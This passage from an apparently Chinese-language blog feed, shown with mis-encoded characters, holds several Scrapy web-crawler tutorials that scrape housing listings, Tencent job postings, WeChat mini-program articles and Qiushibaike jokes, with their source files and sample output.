XuchanghouseItem(scrapy.Item):    estate = scrapy.Field()         # å°åŒº    total = scrapy.Field()          # æ€»ä»·    down_payment = scrapy.Field()    # é¦–ä»˜    unit_price = scrapy.Field()     # å•ä»·    area = scrapy.Field()           # åœ°åŒº    family_type = scrapy.Field()    # æˆ·å‹    time = scrapy.Field()           # å»ºé€ æ—¶é—´    house_types = scrapy.Field()    # ç±»å‹    age_limit = scrapy.Field()      # å¹´ä»£</code></pre><p>middlewares.py</p><p>é»˜è®¤ä¸å˜</p><p>pipelines.py</p><pre><code># -*- coding: utf-8 -*-# Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.htmlfrom scrapy.exporters import JsonLinesItemExporterclass XuchanghousePipeline(object):    def __init__(self):        self.fileProject = open(&quot;XuChangHouse.json&quot;, &#39;wb&#39;)  # jsonæ–‡ä»¶å¯¹è±¡        self.exporters = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporters.export_item(item)        return itemdef close_spider(self, spider):    self.fileProject.close()</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&#39;scrapy crawl resold_Apartment&#39;.split())</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpideræ¡ˆä¾‹è…¾è®¯æ‹›è˜çˆ¬è™«</title>
      <link href="/2018/12/31/scrapycrawlspider-an-li-teng-xun-zhao-pin-pa-chong/"/>
      <url>/2018/12/31/scrapycrawlspider-an-li-teng-xun-zhao-pin-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/pC.BjHS61tcpui4wiUh*nyscELWojfOQhziAA6HNWl8!/b/dMMAAAAAAAAA&amp;bo=gQZFAwAAAAADB.M!&amp;rf=viewer_4" alt="ç»“æœå±•ç¤º"></p><pre><code>{    &quot;èŒä½åå­—&quot;:&quot;27553-è…¾è®¯éŸ³ä¹æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ·±åœ³ï¼‰&quot;,    &quot;è¦æ±‚&quot;:[        &quot;è®¡ç®—æœºç›¸å…³ä¸“ä¸šæœ¬ç§‘åŠä»¥ä¸Šå­¦å†ï¼›&quot;,        &quot;3å¹´ä»¥ä¸Šç³»ç»Ÿæµ‹è¯•å·¥ä½œç»éªŒï¼Œæœ‰ç™½ç›’æµ‹è¯•ç»éªŒï¼Œæœ‰è‡ªåŠ¨åŒ–æµ‹è¯•æ¡†æ¶å¼€å‘ç»éªŒè€…ä¼˜å…ˆï¼›&quot;,        &quot;å…·æœ‰Webã€Androidå’ŒIOSè‡ªåŠ¨åŒ–æµ‹è¯•ç»éªŒï¼Œç†Ÿæ‚‰selenium ã€Appiumæ¡†æ¶ï¼Œç†Ÿç»ƒä½¿ç”¨Jmeterè¿›è¡Œæ€§èƒ½æµ‹è¯•ï¼›&quot;,        &quot;ç†Ÿæ‚‰Linuxç³»ç»Ÿï¼ŒMySqlæ•°æ®åº“, ä»¥åŠTCP/IP, HTTPç­‰ç½‘ç»œåè®®ï¼›&quot;,        &quot;ç†Ÿæ‚‰java/Cæˆ–C++ï¼Œç†Ÿæ‚‰shell/python/PHP/perlç­‰ä¸€ç§è„šæœ¬è¯­è¨€ï¼›&quot;,        &quot;ç†Ÿæ‚‰æµ‹è¯•æµç¨‹å’Œè§„èŒƒï¼Œäº†è§£åŠŸèƒ½æµ‹è¯•ï¼Œæ€§èƒ½æµ‹è¯•ï¼Œæ¥å£æµ‹è¯•å’Œå•å…ƒæµ‹è¯•ç­‰æµ‹è¯•æ–¹æ³•ï¼›&quot;,        &quot;å­¦ä¹ èƒ½åŠ›å’ŒæŠ€æœ¯é’»ç ”èƒ½åŠ›å¼ºï¼Œè‰¯å¥½çš„è´¨é‡æ„è¯†ã€æ²Ÿé€šå’Œå›¢é˜Ÿåˆä½œèƒ½åŠ›ï¼›&quot;,        &quot;å·¥ä½œç§¯æä¸»åŠ¨ï¼Œæ‰§è¡ŒåŠ›å¼ºï¼Œèƒ½å¤Ÿå¿«é€Ÿè§£å†³é—®é¢˜ã€‚&quot;    ],    &quot;å·¥ä½œåœ°ç‚¹&quot;:&quot;æ·±åœ³&quot;,    &quot;æ‹›è˜äººæ•°&quot;:&quot;1äºº&quot;}</code></pre><h1 id="é¡¹ç›®ç›®å½•"><a href="#é¡¹ç›®ç›®å½•" class="headerlink" title="é¡¹ç›®ç›®å½•"></a>é¡¹ç›®ç›®å½•</h1><pre><code>L:.â”‚  scrapy.cfgâ”‚  start.pyâ”‚  è…¾è®¯PythonèŒä½æ‹›è˜ä¿¡æ¯.jsonâ”‚â””â”€TecentSpider    â”‚  items.py    â”‚  middlewares.py    â”‚  pipelines.py    â”‚  settings.py    â”‚  __init__.py    â”‚    â”œâ”€spiders    â”‚  â”‚  TecentZhaoPin.py    â”‚  â”‚  __init__.py    â”‚  â”‚</code></pre><h1 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h1><p>TecentZhaoPin.py</p><pre><code>    # -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom TecentSpider.items import TecentspiderItemclass TecentzhaopinSpider(CrawlSpider):    name = &#39;TecentZhaoPin&#39;    allowed_domains = [&#39;hr.tencent.com&#39;]    start_urls = [&#39;https://hr.tencent.com/position.php?keywords=python&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;.+&amp;start=\d&#39;), follow=True),       # ä¸‹ä¸€é¡µçš„è·å–        Rule(LinkExtractor(allow=r&#39;.+\d&amp;keywords=python&amp;tid=0&amp;lid=0&#39;),callback=&#39;parse_item&#39;,follow=False), # è¯¦æƒ…é¡µé¢çš„URLè·å–    )    def parse_item(self, response):        job_title = response.xpath(&quot;//*[@id=&#39;sharetitle&#39;]/text()&quot;).get()     # èŒä½å        require = response.xpath(&quot;/html/body/div[3]/div/table/tr[4]/td/ul//text()&quot;).getall()      # èŒä½è¦æ±‚\        site = response.xpath(&quot;/html/body/div[3]/div/table/tr[@class=&#39;c bottomline&#39;]/td[1]/text()&quot;).get()   # å·¥ä½œåœ°ç‚¹        people_num = response.xpath(&#39;/html/body/div[3]/div/table/tr[2]/td[3]/text()&#39;).get()     # æ‹›è˜äººæ•°        print(f&quot;èŒä½å:{job_title}\nèŒä½è¦æ±‚{require}\nå·¥ä½œåœ°ç‚¹{site}\næ‹›è˜äººæ•°{people_num}&quot;)        item = TecentspiderItem(job_title=job_title,require=require,site=site,people_num=people_num)        yield item</code></pre><p>items.py</p><pre><code>import scrapyclass TecentspiderItem(scrapy.Item):    job_title = scrapy.Field()      # èŒä½å    require = scrapy.Field()        # èŒä½è¦æ±‚    site = scrapy.Field()           # å·¥ä½œåœ°ç‚¹    people_num = scrapy.Field()     # æ‹›è˜äººæ•°</code></pre><p>middlewares.py</p><p>é»˜è®¤ä¸å˜</p><p>pipelines.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass TecentspiderPipeline(object):    def __init__(self):        self.fileProject = open(&quot;è…¾è®¯PythonèŒä½æ‹›è˜ä¿¡æ¯.json&quot;, &#39;wb&#39;)  # jsonæ–‡ä»¶å¯¹è±¡        self.exporters = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporters.export_item(item)        return item    def close_spider(self, spider):        self.fileProject.close()</code></pre><p>settings.py</p><pre><code>BOT_NAME = &#39;TecentSpider&#39;SPIDER_MODULES = [&#39;TecentSpider.spiders&#39;]NEWSPIDER_MODULE = &#39;TecentSpider.spiders&#39;ROBOTSTXT_OBEY = TrueDOWNLOAD_DELAY = 1ITEM_PIPELINES = {   &#39;TecentSpider.pipelines.TecentspiderPipeline&#39;: 300,}</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl TecentZhaoPin&quot;.split())</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider</title>
      <link href="/2018/12/29/scrapycrawlspider/"/>
      <url>/2018/12/29/scrapycrawlspider/</url>
      
        <content type="html"><![CDATA[<h1 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h1><p>Spiderç±»çš„è®¾è®¡åŸåˆ™æ˜¯åªçˆ¬å–start_urlåˆ—è¡¨ä¸­çš„ç½‘é¡µï¼Œè€ŒCrawlSpiderç±»å®šä¹‰äº†ä¸€äº›è§„åˆ™(rule)æ¥æä¾›è·Ÿè¿›linkçš„æ–¹ä¾¿çš„æœºåˆ¶ï¼Œä»çˆ¬å–çš„ç½‘é¡µä¸­è·å–linkå¹¶ç»§ç»­çˆ¬å–çš„å·¥ä½œæ›´é€‚åˆã€‚</p><p>CrawlSpiderç»§æ‰¿äºSpiderç±»ï¼Œé™¤äº†ç»§æ‰¿è¿‡æ¥çš„å±æ€§å¤–ï¼ˆnameã€allow_domainsï¼‰ï¼Œè¿˜æä¾›äº†æ–°çš„å±æ€§å’Œæ–¹æ³•</p><p>CrawlSpideréœ€è¦ä½¿ç”¨<strong>LinkExtractorå¯¹è±¡å’ŒRuleå¯¹è±¡</strong>æ¥å†³å®šçˆ¬è™«çš„å…·ä½“è®¿é—®è§„åˆ™</p><h1 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h1><p>CrawlSpiderä½¿ç”¨ruleæ¥å†³å®šçˆ¬å–çš„è§„åˆ™,å¹¶å°†åŒ¹é…åçš„urläº¤ç»™å¼•æ“.æ‰€ä»¥ä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨çš„è¿”å›è¯·æ±‚.</p><p>åœ¨Ruleså…ƒç»„ä¸­åŒ…å«äº†ä¸€ä¸ªæˆ–å¤šä¸ªRuleå¯¹è±¡,æ¯ä¸ªRuleå¯¹è±¡å¯¹çˆ¬å–ç½‘ç«™çš„åŠ¨ä½œå®šä¹‰äº†ç‰¹å®šçš„æ“ä½œ,æ¯”å¦‚æå–å½“å‰ç›¸åº”å†…å®¹ä¸­çš„ç‰¹å®šé“¾æ¥,æ˜¯å¦æœ€æå–çš„é“¾æ¥è¿›è¡Œè·Ÿè¿›çˆ¬å–(follw),å¯¹æäº¤çš„è¯·æ±‚è®¾ç½®å›è°ƒå‡½æ•°ç­‰.</p><p>å¦‚æœå¤šä¸ªruleåŒ¹é…äº†ç›¸åŒçš„é“¾æ¥,åˆ™æ ¹æ®è§„åˆ™åœ¨å…ƒç»„ä¸­è¢«å®šä¹‰çš„é¡ºåº,ç¬¬ä¸€ä¸ªä¼šè¢«è°ƒç”¨.</p><pre><code>class scrapy.spiders.Rule(        link_extractor,        callback = None,        cb_kwargs = None,        follow = None,        process_links = None,        process_request = None)</code></pre><p><strong>Ruleå‚æ•°è§£æ:</strong></p><ul><li>link_extractor<ul><li>ä¸€ä¸ªlink_extractorå¯¹è±¡,ç”¨æ¥<strong>å®šä¹‰éœ€è¦æå–çš„é“¾æ¥.</strong></li></ul></li><li>callback<ul><li>æ¯æ¬¡ä»link_extractorä¸­è·å–åˆ°é“¾æ¥æ—¶,å‚æ•°æ‰€æŒ‡å®šçš„å€¼ä¸ºå›è°ƒå‡½æ•°,è¯¥å›è°ƒå‡½æ•°æ¥æ”¶ä¸€ä¸ªresponseä¸º<strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>.</li><li>å½“ç¼–å†™çˆ¬è™«è§„åˆ™æ—¶ï¼Œ<strong>é¿å…ä½¿ç”¨parseä½œä¸ºå›è°ƒå‡½æ•°ã€‚ç”±äºCrawlSpiderä½¿ç”¨parseæ–¹æ³•æ¥å®ç°å…¶é€»è¾‘ï¼Œå¦‚æœè¦†ç›–äº† parseæ–¹æ³•ï¼Œcrawl spiderå°†ä¼šè¿è¡Œå¤±è´¥ã€‚</strong></li></ul></li><li>follow:<ul><li>æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼,<strong>æŒ‡å®šäº†æ ¹æ®è¯¥è§„åˆ™ä»responseæå–çš„é“¾æ¥æ˜¯å¦éœ€è¦è·Ÿè¿›,å¦‚æœcallbackä¼šNone,Followé»˜è®¤ä¸ºTrue,å¦åˆ™é»˜è®¤ä¸ºFalse,ä¹Ÿå°±æ˜¯è¯´å¦‚æœæœ‰å›è°ƒå‡½æ•°çš„è¯,followé»˜è®¤ä¸ºTrue,å¦‚æœæ²¡æœ‰å›è°ƒå‡½æ•°çš„è¯,é»˜è®¤ä¸ºFalse.</strong></li></ul></li><li>process_links<ul><li>æŒ‡å®šè¯¥spiderä¸­å“ªä¸ªå‡½æ•°è¢«è°ƒç”¨,ä»link_extractorä¸­è·å–åˆ°çš„é“¾æ¥åˆ—è¡¨æ—¶å°†ä¼šè°ƒç”¨è¯¥å‡½æ•°.è¯¥æ–¹æ³•ä¸»è¦ç”¨æ¥è¿‡æ»¤link_extractor.</li></ul></li><li>process_request<ul><li>æŒ‡å®šè¯¥spiderä¸­å“ªä¸ªå‡½æ•°è¢«è°ƒç”¨,è¯¥è§„åˆ™æå–åˆ°æ¯ä¸ªrequestæ—¶éƒ½ä¼šè°ƒç”¨è¯¥å‡½æ•°.<strong>ä¸»è¦ç”¨æ¥è¿‡æ»¤request</strong></li></ul></li></ul><h1 id="LinkExtractor"><a href="#LinkExtractor" class="headerlink" title="LinkExtractor"></a>LinkExtractor</h1><p>Link Extractorså¯¹è±¡çš„ä½œç”¨: æå–é“¾æ¥ï½¡</p><p>æ¯ä¸ªLinkExtractorçš„å…¬å…±æ–¹æ³•æ˜¯ extract_links()ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ª Response å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªscrapy.link.Link å¯¹è±¡ã€‚</p><p>Link Extractorsè¦å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œå¹¶ä¸” extract_links æ–¹æ³•ä¼šæ ¹æ®ä¸åŒçš„ response è°ƒç”¨å¤šæ¬¡æå–é“¾æ¥ï½¡</p><pre><code>class scrapy.linkextractors.LinkExtractor(    allow = (),    deny = (),    allow_domains = (),    deny_domains = (),    deny_extensions = None,    restrict_xpaths = (),    tags = (&#39;a&#39;,&#39;area&#39;),    attrs = (&#39;href&#39;),    canonicalize = True,    unique = True,    process_value = None)</code></pre><ul><li>allow<ul><li>æ»¡è¶³æ‹¬å·ä¸­â€œæ­£åˆ™è¡¨è¾¾å¼â€çš„URLä¼šè¢«æå–ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™å…¨éƒ¨åŒ¹é…</li></ul></li><li>deny<ul><li>æ»¡è¶³æ‹¬å·ä¸­â€œæ­£åˆ™è¡¨è¾¾å¼â€çš„URLä¸€å®šä¸æå–ï¼ˆä¼˜å…ˆçº§é«˜äºallowï¼‰ã€‚</li></ul></li><li>allow_domains<ul><li>ä¼šè¢«æå–çš„é“¾æ¥çš„domainsã€‚</li></ul></li><li>deny_domains<ul><li>ä¸€å®šä¸ä¼šè¢«æå–é“¾æ¥çš„domainsã€‚</li></ul></li><li>restrict_xpaths<ul><li>ä½¿ç”¨xpathè¡¨è¾¾å¼ï¼Œå’Œallowå…±åŒä½œç”¨è¿‡æ»¤é“¾æ¥ã€‚ </li></ul></li></ul><h1 id="å®æˆ˜çˆ¬å–å¾®ä¿¡å°ç¨‹åºç¤¾åŒº"><a href="#å®æˆ˜çˆ¬å–å¾®ä¿¡å°ç¨‹åºç¤¾åŒº" class="headerlink" title="å®æˆ˜çˆ¬å–å¾®ä¿¡å°ç¨‹åºç¤¾åŒº"></a>å®æˆ˜çˆ¬å–å¾®ä¿¡å°ç¨‹åºç¤¾åŒº</h1><p>spider.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom WeiXinSmall.items import WeixinsmallItemclass WeixinappSpiderSpider(CrawlSpider):    name = &#39;WeiXinApp_Spider&#39;    allowed_domains = [&#39;wxapp-union.com&#39;]    start_urls = [&#39;http://www.wxapp-union.com/portal.php?mod=list&amp;catid=2&amp;page=1&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;.+mod=list&amp;catid=2&amp;page=\d&#39;), follow=True),  # æ•™ç¨‹é¡µé¢çš„urlè·å–è§„åˆ™        Rule(LinkExtractor(allow=r&#39;.+article-.+\.html&#39;), callback=&quot;parse_detail&quot;, follow=False),  # è¯¦æƒ…é¡µé¢çš„URLè§„åˆ™    )    # def parse_item(self, response):    #     i = {}    #     # i[&#39;domain_id&#39;] = response.xpath(&#39;//input[@id=&quot;sid&quot;]/@value&#39;).extract()    #     # i[&#39;name&#39;] = response.xpath(&#39;//div[@id=&quot;name&quot;]&#39;).extract()    #     # i[&#39;description&#39;] = response.xpath(&#39;//div[@id=&quot;description&quot;]&#39;).extract()    #     return i    def parse_detail(self, response):        &#39;&#39;&#39;è¯¦æƒ…é¡µé¢çš„è§£æ&#39;&#39;&#39;        title = response.xpath(&quot;//h1[@class=&#39;ph&#39;]/text()&quot;).get()        authors = response.xpath(&quot;//p[@class=&#39;authors&#39;]&quot;)        author = authors.xpath(&quot;.//a/text()&quot;).get()        time = authors.xpath(&quot;.//span[@class=&#39;time&#39;]/text()&quot;).get()        article_content = response.xpath(&quot;//*[@id=&#39;article_content&#39;]//text()&quot;).getall()        content = &quot;&quot;.join(article_content).strip()  # content,è¿”å›çš„åˆ—è¡¨ä¸­æœ‰å¾ˆå¤šç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦,è¿™é‡Œåšå¤„ç†        print(content)        print(f&quot;æ–‡ç« ä½œè€…{author}\t\tå‘è¡¨æ—¶é—´{time}&quot;)        print(title)        item = WeixinsmallItem(title=title, author=author, time=time, content=content)        yield item</code></pre><p>Items.py</p><pre><code>import scrapyclass WeixinsmallItem(scrapy.Item):    title = scrapy.Field()      # æ–‡ç« æ ‡é¢˜    author = scrapy.Field()     # æ–‡ç« ä½œè€…    time = scrapy.Field()       # å‘è¡¨æ—¶é—´    content = scrapy.Field()    # æ–‡ç« å†…å®¹</code></pre><p>middlewares.py</p><p>é»˜è®¤æ— ä¿®æ”¹</p><p>pipeline.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass WeixinsmallPipeline(object):    def __init__(self):        self.fileProject = open(&#39;WXApp_Spider.json&#39;, &#39;wb&#39;)        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporter.export_item(item)        return item    def close_spider(self, spider):        self.fileProject.close()</code></pre><p>settings.py</p><pre><code>ITEM_PIPELINES = {   &#39;WeiXinSmall.pipelines.WeixinsmallPipeline&#39;: 300,}DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;,}DOWNLOAD_DELAY = 1      # çˆ¬è™«å»¶è¿Ÿä¸€ç§’é’ŸROBOTSTXT_OBEY = FalseBOT_NAME = &#39;WeiXinSmall&#39;SPIDER_MODULES = [&#39;WeiXinSmall.spiders&#39;]NEWSPIDER_MODULE = &#39;WeiXinSmall.spiders&#39;</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl WeiXinApp_Spider&quot;.split())</code></pre><h1 id="æ•°æ®å±•ç¤º"><a href="#æ•°æ®å±•ç¤º" class="headerlink" title="æ•°æ®å±•ç¤º"></a>æ•°æ®å±•ç¤º</h1>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapyçˆ¬å–ç³—äº‹ç™¾ç§‘</title>
      <link href="/2018/12/27/scrapy-pa-qu-qiu-shi-bai-ke/"/>
      <url>/2018/12/27/scrapy-pa-qu-qiu-shi-bai-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h1><pre><code>{&quot;author&quot;: &quot;æ¯’ç”·Â·i&quot;, &quot;content&quot;: &quot;\n\n\nåœ¨åŒ»é™¢é‡Œï¼Œæˆ‘å’Œè€å©†æŠ±ç€å­©å­å»çœ‹ç—…ã€‚è€å©†è¯´ï¼šâ€œä½ è¯´å¥³äººè¦ä¸è¦å­¦ä¸€ç‚¹é˜²ç‹¼æœ¯ã€‚â€æˆ‘è¯´ï¼šâ€œéœ€è¦å•Šã€‚â€è€å©†è¯´ï¼šâ€œå‡å¦‚æˆ‘èº«è¾¹æœ‰ä¸€åªç‹¼ï¼ŒåŠ¨ä¸åŠ¨å°±æ¬ºè´Ÿæˆ‘ï¼Œè¯¥æ€ä¹ˆåŠã€‚â€æˆ‘è¯´ï¼šâ€œæˆ‘æ¥æ•™è®­ä»–ã€‚â€è€å©†è¯´ï¼šâ€œè€å…¬ä½ å¯¹æˆ‘çœŸå¥½ã€‚â€æˆ‘è¯´ï¼šâ€œé‚£å½“ç„¶äº†ã€‚â€è€å©†è¯´ï¼šâ€œé‚£å¥½ï¼Œä½ å»å‰é¢ç”·ç§‘ï¼ŒæŠŠè‡ªå·±ç»“æ‰äº†ã€‚â€æˆ‘è¯´ï¼šâ€œä¸ºå•¥ã€‚â€è€å©†è¯´ï¼šâ€œå°±æ˜¯ä½ è¿™å¤´ç‹¼ï¼ŒåŠ¨ä¸åŠ¨å°±æŠŠæŒä¸ä½è‡ªå·±ï¼Œæˆ‘åˆå®³æ€•åšäººæµï¼Œæˆ‘é¦–å…ˆå¾—é˜²ä½ å•Šï¼â€\n\n&quot;}{&quot;author&quot;: &quot;æ²¡é’±å•Šï¼ç³—å¤§äº†ã€‚&quot;, &quot;content&quot;: &quot;\n\n\nè¿™å¥³äººçœŸæ˜¯æƒ¹ä¸èµ·ï¼Œå…¬å¸å¼ æ€»è€å»éªšæ‰°å‡ºçº³å‘˜ï¼Œå¼„çš„å¥¹æ‰“ä¹Ÿä¸æ˜¯éª‚ä¹Ÿä¸æ˜¯ï¼Œç»“æœè¿™å›å¼€æ”¯ï¼Œæˆ‘ä»¬éƒ½æ˜¯é¢é¢100å…ƒçš„ï¼Œå‡ºçº³å°½ç„¶æŠŠä»–å¼Ÿå¼Ÿåšä¹°å–çš„é›¶é’±ï¼Œæ‹¿æ¥ç»™å¼ æ€»å¼€æ”¯ï¼Œéƒ½æ˜¯ä¸€å…ƒäº”å…ƒçš„ï¼Œå¥½å—ï¼Œå‡ ä¸‡å—è¶³è¶³ä¸¤å¤§æ–¹ä¾¿è¢‹ï¼Œå‡ºçº³è¯´åœ¨éªšæ‰°æˆ‘ï¼Œä¸‹å›å¼€æ”¯å°±éƒ½æ˜¯ä¸€å…ƒçš„ç¡¬å¸ï¼ŒæŠŠæˆ‘ä»¬ç¬‘çš„è‚šå­éƒ½ç–¼ã€‚\n\n&quot;}{&quot;author&quot;: &quot;æ— ä¹¦æ–‹ä¸»&quot;, &quot;content&quot;: &quot;\n\n\nä¸­åˆæˆ‘åšé¥­çš„æ—¶é—´ï¼Œæ”¾åœ¨å®¢å…çš„ç”µè¯å“äº†ï¼Œæˆ‘é—®è€å©†è°ï¼Ÿè€å©†çœ‹äº†ä¸‹æ˜¯é™Œç”Ÿç”µè¯â€¦â€¦æˆ‘å«æŒ‰å…æå¸®æ¥ä¸‹â€¦â€¦è€å©†æ¥åè¯´äº†å£°:å–‚ï¼Œä½ å¥½â€¦â€¦é‚£è¾¹åœé¡¿å¤§çº¦äº”ç§’å:ä¸€ä¸ªç”·å£°è¯´ï¼Œæˆ‘çˆ±ä½ ï¼ï¼ï¼\n\n&quot;}{&quot;author&quot;: &quot;èƒ–é¦™&quot;, &quot;content&quot;: &quot;\n\n\nè€å¦ˆè¯´è€å®¶äºŒæ¥¼é¡¶å­å¥½åƒæ¼é›¨ï¼Œè®©æˆ‘å“¥è¶æ²¡ä¸Šå†»å›å»ç»™è¡¥è¡¥ï¼Œæˆ‘å“¥æ€»è¯´å¿™ï¼Œæˆ‘æ­äº†ä¸€å¥è¯:â€œè¿™ç‚¹å°äº‹ï¼Œæˆ‘è¿™å¥³æ±‰å­å‡ºé©¬åˆ†åˆ†é’Ÿæå®šï¼â€æˆ‘å¦ˆè€ƒè™‘äº†ä¸€ä¸‹è·Ÿæˆ‘è¯´:â€œåˆ«äº†ï¼Œå†¬å¤©ä¹Ÿæ²¡å¤§é›¨ï¼Œä½ è¦æ˜¯ä¸Šå»ä¿®ä¸å¥½å†å‹ä¸€ä¸‹ï¼Œæˆ‘æ€•åˆ°æ—¶å€™å±‹é‡Œé£˜é›ªèŠ±â€¦â€¦â€\n\n&quot;}{&quot;author&quot;: &quot;å­™å°æ¬ å„¿&quot;, &quot;content&quot;: &quot;\n\n\næ™šä¸ŠèººåºŠä¸Šé—®åª³å¦‡å„¿â€œå—²â€æ€ä¹ˆå†™ï¼Œåª³å¦‡å„¿è¯´é‚£ä¹ˆç®€å•çš„å­—éƒ½ä¸ä¼šå†™â€˜è¿™è¾¹ä¸€ä¸ªå£é‚£è¾¹ä¸€ä¸ªçˆ¹â€™æˆ‘Aäº†ä¸€å£°â€¦â€¦â€¦â€¦ç„¶åå°±åœ¨åºŠä¸‹å•¦\n\n&quot;}{&quot;author&quot;: &quot;èŠå¤©ä¸æ’©å¦¹å­&quot;, &quot;content&quot;: &quot;\n\n\nå°ä¾„å¥³åˆä¸­æ¯•ä¸šå°±ä¸è¯»ä¹¦äº†ï¼Œå¤©å¤©åœ¨å®¶ç©æ¸¸æˆï¼Œä»€ä¹ˆäº‹ä¹Ÿä¸åšï¼Œå ‚å“¥è®©æˆ‘ç»™æ‰¾ä¸ªç­ä¸Šã€‚å…¬å¸è¾¹ä¸Šåˆšå¥½æœ‰å®¶é£Ÿå“å‚æ‹›äººï¼Œå°±ä»‹ç»å¥¹å»äº†ã€‚æ˜¨å¤©å‚é‡Œå‘å·¥èµ„ï¼Œæˆ‘é—®å¥¹æ‹¿äº†å¤šå°‘é’±ã€‚å¥¹è¯´å‘å…­ç™¾å¤šã€‚æˆ‘é—®å¥¹è¯´è¯•ç”¨æœŸå·¥èµ„ä¹Ÿä¸å¯èƒ½è¿™ä¹ˆä½å§ï¼Œè¦ä¸æ¢ä¸ªå‚ä¸Šç­å»ã€‚å¥¹è¯´æ‰ä¸æ¢å‘¢ï¼Œå‚é‡Œç”Ÿäº§çš„éƒ½æ˜¯æˆ‘çˆ±åƒçš„ï¼Œä¸€ä¸ªæœˆæˆ‘éƒ½é•¿é«˜ä¸¤å…¬åˆ†äº†ã€‚é•¿é«˜æ²¡é•¿é«˜æˆ‘ä¸çŸ¥é“ï¼Œåæ­£è„¸è›‹å›­äº†\n\n&quot;}{&quot;author&quot;: &quot;é™Œå¹´å¾®å‡‰-&quot;, &quot;content&quot;: &quot;\n\n\nè‡ªä»äº¤äº†å¥³æœ‹å‹æˆ‘æ‰çŸ¥é“ï¼ŒåŸæ¥å£çº¢æœ‰æ­£çº¢ï¼Œæ«å¶çº¢ï¼Œç«ç‘°çº¢ï¼æŠ¤è‚¤çš„æœ‰ç²¾åæ¶²ï¼Œçˆ½è‚¤æ°´ï¼Œè¡¥æ°´ä¹³è¿˜æœ‰é¢éœœï¼Œçœ¼éœœï¼Œå”‡è†œï¼å¹¶ä¸”æˆ‘è¿˜çŸ¥é“äº†ï¼Œç”·æœ‹å‹å¯ä»¥æœ‰å¥½å‡ ä¸ªï¼Œæš–åºŠçš„ï¼Œä»˜é’±çš„ï¼Œæ— èŠçš„æ—¶å€™é™ªç©çš„ï½\n\n&quot;}{&quot;author&quot;: &quot;æ— ä¹¦æ–‹ä¸»&quot;, &quot;content&quot;: 